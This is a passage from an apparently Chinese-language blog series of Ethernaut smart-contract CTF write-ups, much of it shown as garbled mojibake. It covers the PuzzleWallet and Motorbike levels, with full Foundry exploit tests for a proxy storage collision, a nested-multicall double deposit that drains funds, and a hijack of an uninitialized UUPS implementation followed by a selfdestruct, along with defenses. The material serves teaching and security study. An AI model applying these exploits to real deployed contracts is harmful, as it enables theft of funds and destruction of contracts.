class=\"line\">            require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class=\"line\">            depositCalled = true;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        (bool success, ) = address(this).delegatecall(data[i]);</span><br><span class=\"line\">        // ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>å‡½æ•°é€šè¿‡ <code>depositCalled</code> æ ‡å¿—ä½æ¥é˜²æ­¢åœ¨ä¸€æ¬¡ <code>multicall</code> ä¸­å¤šæ¬¡è°ƒç”¨ <code>deposit()</code>ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªä¿æŠ¤æªæ–½æ˜¯æœ‰ç¼ºé™·çš„ã€‚<code>depositCalled</code> æ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œå®ƒçš„ä½œç”¨åŸŸä»…é™äºå•æ¬¡ <code>multicall</code> è°ƒç”¨ã€‚å¦‚æœæˆ‘ä»¬<strong>åœ¨ä¸€ä¸ª <code>multicall</code> è°ƒç”¨ä¸­åµŒå¥—å¦ä¸€ä¸ª <code>multicall</code> è°ƒç”¨</strong>ï¼Œé‚£ä¹ˆå†…éƒ¨çš„ <code>multicall</code> ä¼šæœ‰è‡ªå·±çš„ã€å…¨æ–°çš„ <code>depositCalled</code> æ ‡å¿—ä½ã€‚</p>\n<p>è¿™å…è®¸æˆ‘ä»¬ç»•è¿‡æ£€æŸ¥ï¼Œå®ç°â€œåŒé‡å­˜æ¬¾â€ï¼š</p>\n<ol>\n<li>æˆ‘ä»¬å‘ <code>multicall</code> å‘é€ 0.001 etherã€‚</li>\n<li><code>multicall</code> çš„ç¬¬ä¸€ä¸ªè°ƒç”¨æ˜¯ <code>deposit()</code>ã€‚è¿™ä¼šæŠŠæˆ‘ä»¬çš„ <code>msg.value</code> (0.001 ether) å­˜å…¥ï¼Œå¹¶å°†æˆ‘ä»¬çš„ä½™é¢è®°å½•ä¸º 0.001 etherã€‚</li>\n<li><code>multicall</code> çš„ç¬¬äºŒä¸ªè°ƒç”¨æ˜¯<strong>å¯¹ <code>multicall</code> è‡ªèº«çš„åµŒå¥—è°ƒç”¨</strong>ã€‚åœ¨è¿™ä¸ªåµŒå¥—è°ƒç”¨ä¸­ï¼Œæˆ‘ä»¬å†æ¬¡è°ƒç”¨ <code>deposit()</code>ã€‚</li>\n<li>ç”±äº <code>delegatecall</code> çš„ç‰¹æ€§ï¼Œ<code>msg.value</code> åœ¨åµŒå¥—è°ƒç”¨ä¸­ä¿æŒä¸å˜ã€‚å› æ­¤ï¼Œç¬¬äºŒæ¬¡ <code>deposit()</code> ä¼šå†æ¬¡å°†åŒä¸€ä¸ª <code>msg.value</code> (0.001 ether) å­˜å…¥ï¼Œä½¿æˆ‘ä»¬çš„è®°å½•ä½™é¢å˜ä¸º 0.002 etherã€‚</li>\n</ol>\n<p>æˆ‘ä»¬åªå‘é€äº† 0.001 etherï¼Œä½†åœ¨åˆçº¦ä¸­çš„å­˜æ¬¾è®°å½•å´æ˜¯ 0.002 etherã€‚ç°åœ¨ï¼Œæˆ‘ä»¬è°ƒç”¨ <code>execute(player, 0.002 ether, &quot;&quot;)</code>ï¼Œå°±å¯ä»¥æèµ°åˆçº¦ä¸­æ‰€æœ‰çš„èµ„é‡‘ï¼ˆæˆ‘ä»¬å­˜å…¥çš„0.001 + åˆçº¦åŸæœ‰çš„0.001ï¼‰ã€‚</p>\n<h3 id=\"æœ€ç»ˆæ”»å‡»æµç¨‹\"><a href=\"#æœ€ç»ˆæ”»å‡»æµç¨‹\" class=\"headerlink\" title=\"æœ€ç»ˆæ”»å‡»æµç¨‹\"></a>æœ€ç»ˆæ”»å‡»æµç¨‹</h3><ol>\n<li><strong>æˆä¸º <code>owner</code></strong>: è°ƒç”¨ <code>proxy.proposeNewAdmin(player)</code>ã€‚</li>\n<li><strong>åŠ å…¥ç™½åå•</strong>: è°ƒç”¨ <code>wallet.addToWhitelist(player)</code>ã€‚</li>\n<li><strong>åŒé‡å­˜æ¬¾</strong>: æ„é€ ä¸€ä¸ªåµŒå¥—çš„ <code>multicall</code> è°ƒç”¨ï¼Œå‘é€ 0.001 etherï¼Œä½¿è‡ªå·±çš„å­˜æ¬¾è®°å½•å˜ä¸º 0.002 etherã€‚</li>\n<li><strong>æ¸…ç©ºåˆçº¦</strong>: è°ƒç”¨ <code>wallet.execute(player, 0.002 ether, &quot;&quot;)</code> æèµ°æ‰€æœ‰èµ„é‡‘ã€‚</li>\n<li><strong>æˆä¸º <code>admin</code></strong>: è°ƒç”¨ <code>wallet.setMaxBalance(uint256(uint160(player)))</code>ï¼Œå°† <code>maxBalance</code> (å³ <code>admin</code>) è®¾ç½®ä¸ºæˆ‘ä»¬çš„åœ°å€ã€‚</li>\n</ol>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/24_PuzzleWallet.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PuzzleWalletTest is Test &#123;</span><br><span class=\"line\">    PuzzleProxy proxy;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\">    PuzzleWallet wallet;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // éƒ¨ç½²é€»è¾‘åˆçº¦å’Œä»£ç†åˆçº¦</span><br><span class=\"line\">        PuzzleWallet puzzleWallet = new PuzzleWallet();</span><br><span class=\"line\">        bytes memory data = abi.encodeWithSelector(PuzzleWallet.init.selector, 1 ether);</span><br><span class=\"line\">        proxy = new PuzzleProxy(address(this), address(puzzleWallet), data);</span><br><span class=\"line\">        wallet = PuzzleWallet(address(proxy));</span><br><span class=\"line\"></span><br><span class=\"line\">        // åˆå§‹è®¾ç½®ï¼Œå­˜å…¥ 0.001 ether</span><br><span class=\"line\">        vm.deal(address(this), 0.001 ether);</span><br><span class=\"line\">        wallet.addToWhitelist(address(this));</span><br><span class=\"line\">        wallet.deposit&#123;value: 0.001 ether&#125;();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testPuzzleWalletAttack() public &#123;</span><br><span class=\"line\">        vm.deal(player, 0.001 ether);</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 1. æˆä¸º owner</span><br><span class=\"line\">        proxy.proposeNewAdmin(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. åŠ å…¥ç™½åå•</span><br><span class=\"line\">        wallet.addToWhitelist(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. æ„é€ åµŒå¥— multicall ä»¥å®ç°åŒé‡å­˜æ¬¾</span><br><span class=\"line\">        bytes[] memory nestedCalls = new bytes[](1);</span><br><span class=\"line\">        nestedCalls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);</span><br><span class=\"line\"></span><br><span class=\"line\">        bytes[] memory calls = new bytes[](2);</span><br><span class=\"line\">        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);</span><br><span class=\"line\">        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, nestedCalls);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // å‘é€ 0.001 etherï¼Œä½†å­˜æ¬¾ä¸¤æ¬¡</span><br><span class=\"line\">        wallet.multicall&#123;value: 0.001 ether&#125;(calls);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. æèµ°æ‰€æœ‰èµ„é‡‘ (0.002 ether)</span><br><span class=\"line\">        wallet.execute(player, 0.002 ether, &quot;&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 5. æˆä¸º admin</span><br><span class=\"line\">        wallet.setMaxBalance(uint256(uint160(player)));</span><br><span class=\"line\"></span><br><span class=\"line\">        // éªŒè¯æˆåŠŸ</span><br><span class=\"line\">        assertEq(proxy.admin(), player);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><strong>å¯¹é½å­˜å‚¨å¸ƒå±€</strong>: åœ¨ä½¿ç”¨ä»£ç†æ¨¡å¼æ—¶ï¼Œå¿…é¡»ç¡®ä¿ä»£ç†åˆçº¦å’Œé€»è¾‘åˆçº¦çš„å­˜å‚¨å¸ƒå±€æ˜¯å…¼å®¹çš„ï¼Œä»¥é¿å…å­˜å‚¨å†²çªã€‚åœ¨ä»£ç†åˆçº¦ä¸­ä¸ºæœªæ¥çš„å‡çº§ä¿ç•™ä¸€äº›ç©ºçš„å­˜å‚¨æ§½æ˜¯ä¸€ç§å¸¸è§çš„åšæ³•ã€‚</li>\n<li><strong>ä¿®å¤ <code>multicall</code> æ¼æ´</strong>: <code>multicall</code> ä¸­çš„é‡å…¥ä¿æŠ¤åº”è¯¥ä½¿ç”¨çŠ¶æ€å˜é‡è€Œä¸æ˜¯å±€éƒ¨å˜é‡ã€‚å°† <code>depositCalled</code> å£°æ˜ä¸ºåˆçº¦çš„çŠ¶æ€å˜é‡ï¼Œå¹¶åœ¨ <code>multicall</code> å¼€å§‹æ—¶è®¾ç½®ï¼Œç»“æŸæ—¶æ¸…é™¤ï¼Œå¯ä»¥é˜²æ­¢åµŒå¥—è°ƒç”¨ç»•è¿‡æ£€æŸ¥ã€‚</li>\n<li><strong>åŸå­åŒ–çŠ¶æ€å˜æ›´</strong>: é¿å…åœ¨ä¸€æ¬¡å‡½æ•°è°ƒç”¨ä¸­æ··åˆå¤šç§å¤æ‚é€»è¾‘ï¼ˆå¦‚å­˜æ¬¾å’Œä»»æ„ <code>delegatecall</code>ï¼‰ã€‚å°†åŠŸèƒ½åˆ†è§£ä¸ºæ›´å°ã€æ›´åŸå­åŒ–çš„å‡½æ•°å¯ä»¥å‡å°‘æ„å¤–çš„äº¤äº’ã€‚</li>\n</ol>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li><strong>ä»£ç†å­˜å‚¨å†²çª</strong>: <code>delegatecall</code> çš„æ ¸å¿ƒé£é™©ä¹‹ä¸€ã€‚ä»£ç†å’Œé€»è¾‘åˆçº¦çš„å­˜å‚¨å˜é‡å¿…é¡»ç²¾ç¡®å¯¹é½ï¼Œå¦åˆ™ä¸€ä¸ªåˆçº¦çš„å˜é‡å¯èƒ½ä¼šè¢«å¦ä¸€ä¸ªåˆçº¦çš„å‡½æ•°æ„å¤–åœ°ä¿®æ”¹ã€‚</li>\n<li><strong>åµŒå¥— <code>delegatecall</code></strong>: å¯¹ <code>delegatecall</code> çš„åµŒå¥—è°ƒç”¨ä¼šç»§æ‰¿åŸå§‹è°ƒç”¨çš„ä¸Šä¸‹æ–‡ï¼ˆå¦‚ <code>msg.sender</code>, <code>msg.value</code>ï¼‰ï¼Œä½†ä¼šåˆ›å»ºæ–°çš„å±€éƒ¨å˜é‡ä½œç”¨åŸŸï¼Œè¿™å¯èƒ½è¢«ç”¨æ¥ç»•è¿‡åŸºäºå±€éƒ¨å˜é‡çš„å®‰å…¨æ£€æŸ¥ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>åˆ©ç”¨å­˜å‚¨å†²çªï¼Œé€šè¿‡è°ƒç”¨ä¸€ä¸ªçœ‹ä¼¼æ— å…³çš„å‡½æ•°ï¼ˆ<code>proposeNewAdmin</code>ï¼‰æ¥ä¿®æ”¹ä¸€ä¸ªå…³é”®çš„çŠ¶æ€å˜é‡ï¼ˆ<code>owner</code>ï¼‰ã€‚</li>\n<li>åˆ©ç”¨ <code>multicall</code> ä¸­åŸºäºå±€éƒ¨å˜é‡çš„é‡å…¥ä¿æŠ¤ç¼ºé™·ï¼Œé€šè¿‡åµŒå¥—è°ƒç”¨å®ç°åŒé‡è®°è´¦ï¼Œä»è€Œçªƒå–åˆçº¦èµ„é‡‘ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>ä»”ç»†è§„åˆ’å’ŒéªŒè¯ä»£ç†åˆçº¦çš„å­˜å‚¨å¸ƒå±€ã€‚</li>\n<li>ä½¿ç”¨çŠ¶æ€å˜é‡æ¥å®ç°é‡å…¥ä¿æŠ¤ï¼Œè€Œä¸æ˜¯å±€éƒ¨å˜é‡ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable\">OpenZeppelin: Writing Upgradeable Contracts</a></li>\n<li><a href=\"https://swcregistry.io/docs/SWC-112\">SWC-112: Delegatecall to Untrusted Callee</a></li>\n</ul>\n"},{"title":"Ethernaut Level 25: Motorbike - UUPSä»£ç†æœªæˆæƒåˆå§‹åŒ–æ¼æ´","date":"2025-01-25T09:10:00.000Z","updated":"2025-01-25T09:10:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"åˆ©ç”¨UUPSä»£ç†æ¨¡å¼ä¸­å®ç°åˆçº¦æœªè¢«åˆå§‹åŒ–çš„æ¼æ´ï¼Œç›´æ¥è°ƒç”¨å®ç°åˆçº¦çš„ `initialize` å‡½æ•°æˆä¸º `upgrader`ã€‚éšåï¼Œå°†å®ç°åˆçº¦å‡çº§ä¸ºä¸€ä¸ªæ¶æ„çš„è‡ªæ¯åˆçº¦ï¼Œä»è€Œæ‘§æ¯å¼•æ“ï¼ŒæŒæ¡ Motorbike å…³å¡çš„ç ´è§£æŠ€å·§ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 25: Motorbike - UUPSä»£ç†æœªæˆæƒåˆå§‹åŒ–æ¼æ´\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 25 - Motorbike](https://ethernaut.openzeppelin.com/level/25)  \n> **æ”»å‡»ç±»å‹**: æœªåˆå§‹åŒ–çš„å®ç°åˆçº¦ (Uninitialized Implementation)  \n> **éš¾åº¦**: â­â­â­â­â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\næœ¬å…³çš„ç›®æ ‡æ˜¯æ‘§æ¯ `Engine` (å¼•æ“) åˆçº¦ï¼Œå³ä½¿å¾— `Engine` åˆçº¦çš„ä»£ç è¢«ä»é“¾ä¸Šç§»é™¤ã€‚ä½ éœ€è¦åˆ©ç”¨ä»£ç†åˆçº¦çš„æ¼æ´æ¥å®ç°è¿™ä¸€ç›®æ ‡ã€‚\n\n![Motorbike Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel25.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\næœ¬å…³å¡æ¶‰åŠçš„æ˜¯ UUPS (Universal Upgradeable Proxy Standard) ä»£ç†æ¨¡å¼ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œå‡çº§é€»è¾‘ä½äºå®ç°åˆçº¦ï¼ˆ`Engine`ï¼‰ä¸­ï¼Œè€Œä¸æ˜¯ä»£ç†åˆçº¦ï¼ˆ`Motorbike`ï¼‰ä¸­ã€‚\n\n-   `Motorbike`: ä»£ç†åˆçº¦ï¼Œè´Ÿè´£å°†è°ƒç”¨è½¬å‘åˆ° `Engine`ã€‚\n-   `Engine`: å®ç°åˆçº¦ï¼ŒåŒ…å«ä¸šåŠ¡é€»è¾‘å’Œå‡çº§é€»è¾‘ã€‚\n\né€šå¸¸ï¼Œä»£ç†åˆçº¦åœ¨éƒ¨ç½²åä¼šè°ƒç”¨å®ç°åˆçº¦çš„ `initialize` å‡½æ•°æ¥è®¾ç½®åˆå§‹çŠ¶æ€ï¼ˆå¦‚ `owner`, `upgrader` ç­‰ï¼‰ã€‚ç„¶è€Œï¼Œè¿™ä¸ªåˆå§‹åŒ–è°ƒç”¨åªå‘ç”Ÿåœ¨ä»£ç†åˆçº¦çš„ä¸Šä¸‹æ–‡ä¸­ã€‚**å®ç°åˆçº¦æœ¬èº«ï¼ˆå³ `Engine` åˆçº¦ï¼‰çš„ `initialize` å‡½æ•°ä»æœªè¢«è°ƒç”¨è¿‡**ï¼Œå¯¼è‡´å…¶çŠ¶æ€å˜é‡ï¼ˆå¦‚ `upgrader`ï¼‰ä»ä¸ºé»˜è®¤å€¼ï¼ˆ`address(0)`ï¼‰ã€‚\n\nè¿™å°±æ˜¯æ ¸å¿ƒæ¼æ´ï¼šä»»ä½•äººéƒ½å¯ä»¥ç›´æ¥è°ƒç”¨ `Engine` å®ç°åˆçº¦çš„ `initialize()` å‡½æ•°ã€‚\n\n```solidity\n// In Engine.sol\naddress public upgrader;\n\nfunction initialize() public {\n    require(upgrader == address(0)); // This check passes on the uninitialized Engine contract\n    upgrader = msg.sender;\n}\n```\n\nä¸€æ—¦æˆ‘ä»¬è°ƒç”¨äº† `Engine` çš„ `initialize()`ï¼Œæˆ‘ä»¬å°±ä¼šæˆä¸º `Engine` åˆçº¦çš„ `upgrader`ã€‚ä½œä¸º `upgrader`ï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ `upgradeToAndCall()` å‡½æ•°ã€‚\n\n```solidity\n// In Engine.sol\nfunction upgradeToAndCall(address newImplementation, bytes memory data) public payable {\n    _authorizeUpgrade();\n    _upgradeToAndCall(newImplementation, data);\n}\n\nfunction _authorizeUpgrade() internal view {\n    require(msg.sender == upgrader, \"Can't upgrade\");\n}\n```\n\n`upgradeToAndCall()` å…è®¸æˆ‘ä»¬å°† `Engine` çš„å®ç°æŒ‡å‘ä¸€ä¸ªå…¨æ–°çš„åˆçº¦ï¼Œå¹¶æ‰§è¡Œæ–°åˆçº¦ä¸­çš„ä»»æ„å‡½æ•°ã€‚æˆ‘ä»¬çš„æ”»å‡»è®¡åˆ’æ˜¯ï¼š\n\n1.  **æ‰¾åˆ° `Engine` å®ç°åˆçº¦çš„åœ°å€**: UUPSä»£ç†çš„å®ç°åœ°å€å­˜å‚¨åœ¨ç‰¹å®šçš„å­˜å‚¨æ§½ä½ `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`ã€‚\n2.  **æˆä¸º `upgrader`**: ç›´æ¥è°ƒç”¨ `Engine` åˆçº¦çš„ `initialize()` å‡½æ•°ã€‚\n3.  **éƒ¨ç½²æ¶æ„åˆçº¦**: åˆ›å»ºä¸€ä¸ªåŒ…å« `selfdestruct` é€»è¾‘çš„æ”»å‡»åˆçº¦ã€‚\n4.  **å‡çº§å¹¶è‡ªæ¯**: è°ƒç”¨ `Engine` çš„ `upgradeToAndCall()`ï¼Œå°†å®ç°æŒ‡å‘æˆ‘ä»¬çš„æ¶æ„åˆçº¦ï¼Œå¹¶è°ƒç”¨å…¶è‡ªæ¯å‡½æ•°ã€‚\n\n**å…³äº Dencun å‡çº§ (EIP-6780) çš„è¯´æ˜**: åœ¨ Dencun å‡çº§åï¼Œ`selfdestruct` çš„è¡Œä¸ºå‘ç”Ÿäº†å˜åŒ–ã€‚å®ƒä¸å†æ— æ¡ä»¶åœ°ç§»é™¤åˆçº¦ä»£ç ã€‚ç„¶è€Œï¼Œåœ¨è®¸å¤šæµ‹è¯•ç¯å¢ƒå’Œä¸€äº›ç‰¹å®šæ¡ä»¶ä¸‹ï¼Œæ­¤æ”»å‡»ä»ç„¶æœ‰æ•ˆã€‚æœ¬è§£æ³•åŸºäº `selfdestruct` èƒ½å¤Ÿç§»é™¤åˆçº¦ä»£ç çš„ç»å…¸è¡Œä¸ºã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### Foundry æµ‹è¯•ä»£ç \n\næµ‹è¯•ä»£ç å°†å®Œæ•´åœ°æ¨¡æ‹Ÿä¸Šè¿°æ”»å‡»æµç¨‹ã€‚\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/25_Motorbike.sol\";\n\n// æ¥å£å®šä¹‰\ninterface IEngine {\n    function initialize() external;\n    function upgradeToAndCall(address newImplementation, bytes memory data) external;\n    function upgrader() external view returns (address);\n}\n\n// åŒ…å«è‡ªæ¯é€»è¾‘çš„æ”»å‡»åˆçº¦\ncontract Attack {\n    function boom() external payable {\n        selfdestruct(payable(msg.sender));\n    }\n}\n\ncontract MotorbikeTest is Test {\n    Motorbike motorbikeInstance;\n    IEngine engineInstance;\n    address player;\n    address engineAddress;\n\n    function setUp() public {\n        player = vm.addr(1);\n        \n        // éƒ¨ç½²å…³å¡åˆçº¦\n        Engine engine = new Engine();\n        motorbikeInstance = new Motorbike(address(engine));\n\n        // ä»ä»£ç†åˆçº¦çš„å­˜å‚¨ä¸­è¯»å–å®ç°åˆçº¦çš„åœ°å€\n        bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n        engineAddress = address(uint160(uint256(vm.load(address(motorbikeInstance), implementationSlot))));\n        engineInstance = IEngine(engineAddress);\n    }\n\n    function testMotorbikeAttack() public {\n        vm.startPrank(player);\n\n        // 1. éƒ¨ç½²æ”»å‡»åˆçº¦\n        Attack attackContract = new Attack();\n\n        // 2. ç›´æ¥è°ƒç”¨å®ç°åˆçº¦çš„ initialize å‡½æ•°ï¼Œæˆä¸º upgrader\n        engineInstance.initialize();\n        assertEq(engineInstance.upgrader(), player, \"Player should be the upgrader\");\n\n        // 3. å‡çº§å®ç°åˆçº¦ä¸ºæˆ‘ä»¬çš„æ”»å‡»åˆçº¦ï¼Œå¹¶è°ƒç”¨ boom() å‡½æ•°è‡ªæ¯\n        bytes memory data = abi.encodeWithSignature(\"boom()\");\n        engineInstance.upgradeToAndCall(address(attackContract), data);\n\n        // 4. éªŒè¯å®ç°åˆçº¦çš„ä»£ç æ˜¯å¦å·²è¢«ç§»é™¤\n        assertEq(engineAddress.code.length, 0, \"Engine contract should be destroyed\");\n\n        vm.stopPrank();\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **å®šä½å®ç°åˆçº¦**: ä½¿ç”¨ `vm.load` å’Œ EIP-1967 å®šä¹‰çš„å­˜å‚¨æ§½ä½åœ°å€ï¼Œä»ä»£ç†åˆçº¦ä¸­æ‰¾åˆ° `Engine` å®ç°åˆçº¦çš„åœ°å€ã€‚\n2.  **è°ƒç”¨ `initialize()`**: ç›´æ¥ä¸ `Engine` åˆçº¦äº¤äº’ï¼Œè°ƒç”¨å…¶ `initialize()` å‡½æ•°ï¼Œå°† `player` è®¾ç½®ä¸º `upgrader`ã€‚\n3.  **éƒ¨ç½²æ”»å‡»åˆçº¦**: åˆ›å»ºä¸€ä¸ªç®€å•çš„ `Attack` åˆçº¦ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªå…¬å…±çš„ `boom()` å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šè°ƒç”¨ `selfdestruct`ã€‚\n4.  **æ‰§è¡Œ `upgradeToAndCall()`**: è°ƒç”¨ `Engine` åˆçº¦çš„ `upgradeToAndCall()`ï¼Œå°† `newImplementation` è®¾ç½®ä¸º `Attack` åˆçº¦çš„åœ°å€ï¼Œå¹¶å°† `data` è®¾ç½®ä¸º `boom()` å‡½æ•°çš„å‡½æ•°é€‰æ‹©å™¨ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **åˆå§‹åŒ–å®ç°åˆçº¦**: åœ¨éƒ¨ç½²å®ç°åˆçº¦åï¼Œåº”ç«‹å³è°ƒç”¨å…¶ `initialize` å‡½æ•°ï¼ˆæˆ–åœ¨æ„é€ å‡½æ•°ä¸­å®Œæˆåˆå§‹åŒ–ï¼‰ï¼Œä»¥é˜²æ­¢å…¶ä»–äººæŠ¢å…ˆè°ƒç”¨ã€‚å¯ä»¥æ·»åŠ ä¸€ä¸ª `initialized` çŠ¶æ€å˜é‡æ¥ç¡®ä¿åˆå§‹åŒ–åªè¿›è¡Œä¸€æ¬¡ã€‚\n\n    ```solidity\n    // ä¿®å¤å»ºè®®\n    contract Engine {\n        bool private _initialized;\n        constructor() {\n            _disableInitializers();\n        }\n        function initialize() public initializer {\n            // ...\n        }\n    }\n    ```\n    OpenZeppelin çš„ `Initializable` åˆçº¦æä¾›äº†ä¸€ä¸ª `initializer` ä¿®é¥°ç¬¦ï¼Œå¯ä»¥å¾ˆå¥½åœ°è§£å†³è¿™ä¸ªé—®é¢˜ã€‚\n\n2.  **æ„é€ å‡½æ•°ä¸­åˆå§‹åŒ–**: å¯¹äºä¸å¯å‡çº§çš„åˆçº¦ï¼Œåº”åœ¨ `constructor` ä¸­å®Œæˆæ‰€æœ‰åˆå§‹åŒ–ï¼Œä»¥ç¡®ä¿åœ¨éƒ¨ç½²æ—¶å°±è®¾ç½®å¥½æ‰€æœ‰æƒå’Œå…³é”®å‚æ•°ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **UUPS (Universal Upgradeable Proxy Standard)**: EIP-1822 å®šä¹‰çš„ä¸€ç§ä»£ç†æ¨¡å¼ï¼Œå®ƒå°†å‡çº§é€»è¾‘æ”¾åœ¨å®ç°åˆçº¦ä¸­ï¼Œæ¯”æ—§çš„é€æ˜ä»£ç†æ¨¡å¼æ›´èŠ‚çœ Gasã€‚\n-   **EIP-1967**: å®šä¹‰äº†ä»£ç†åˆçº¦ä¸­ç”¨äºå­˜å‚¨é€»è¾‘åˆçº¦åœ°å€å’Œç®¡ç†å‘˜åœ°å€çš„æ ‡å‡†å­˜å‚¨æ§½ä½ï¼Œä»¥é¿å…å­˜å‚¨å†²çªã€‚\n-   **æœªåˆå§‹åŒ–çš„ä»£ç†/å®ç°**: ä»£ç†åˆçº¦å®‰å…¨ä¸­ä¸€ä¸ªå¸¸è§çš„æ¼æ´ç±»åˆ«ã€‚æ— è®ºæ˜¯ä»£ç†æœ¬èº«è¿˜æ˜¯å…¶å®ç°åˆçº¦ï¼Œå¦‚æœå…¶åˆå§‹åŒ–å‡½æ•°å¯ä»¥è¢«ä»»ä½•äººè°ƒç”¨ï¼Œå°±ä¼šå¯¼è‡´ä¸¥é‡çš„å®‰å…¨é—®é¢˜ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   åœ¨ä½¿ç”¨ UUPS ä»£ç†æ¨¡å¼æ—¶ï¼Œä¸ä»…ä»£ç†éœ€è¦åˆå§‹åŒ–ï¼Œå…¶åº•å±‚çš„å®ç°åˆçº¦ä¹Ÿéœ€è¦è¢«æ­£ç¡®åœ°åˆå§‹åŒ–æˆ–ç¦ç”¨åˆå§‹åŒ–å‡½æ•°ã€‚\n-   